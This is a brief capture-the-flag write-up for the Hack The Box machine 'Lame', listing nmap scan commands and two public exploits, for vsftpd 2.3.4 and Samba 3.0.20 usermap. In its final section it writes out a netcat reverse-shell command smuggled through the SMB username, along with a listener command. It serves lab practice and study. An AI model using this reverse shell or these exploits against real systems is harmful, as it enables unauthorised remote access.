# Lame

> Reference:
>
> - <https://0xdf.gitlab.io/2020/04/07/htb-lame.html>

## Port Scanning

```bash
sudo nmap -vv -n -e utun6 -sS -sV --top-ports 1000 $ipaddr
sudo nmap -vv -sC -sV -T4 -A $ipaddr
```

- `-vv`: verbose
- `-n`: no DNS resolution
- `-e`: choose the correct network interface
- `-sS`: TCP SYN scan
- `-sC`: script scan
- `-sV`: service version detection
- `--top-ports`: specify top N ports
- `-T4`: timing template (higher is faster)
- `-A`: aggressive scan options. Enable OS detection, version detection, script scanning, and traceroute

## Exploits

- [vsftpd 2.3.4 - Backdoor Command Execution](https://www.exploit-db.com/exploits/49757)
    - This exploit successes, but external connections cannot be established due to some firewall configurations
- [Samba 3.0.20 usermap](https://www.exploit-db.com/exploits/16320)
    - This exploit can run arbitrary commands that are specified in the SMB username
    - We can utilize this exploit to establish a reverse shell, such as `nc -e /bin/sh $myip $myport`
    - On my local machine, running `nc -nlvp $myport` can interact with the remote machine
